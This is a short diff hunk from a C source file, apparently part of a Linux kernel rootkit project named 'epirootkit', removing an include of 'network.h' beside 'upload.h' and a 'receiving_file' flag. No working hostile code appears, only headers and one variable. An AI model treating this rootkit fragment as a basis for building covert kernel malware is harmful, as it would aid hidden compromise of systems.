@@ -4,7 +4,6 @@
 #include <linux/uaccess.h>
 
 #include "epirootkit.h"
-#include "network.h"
 #include "upload.h"
 
 bool receiving_file = false;
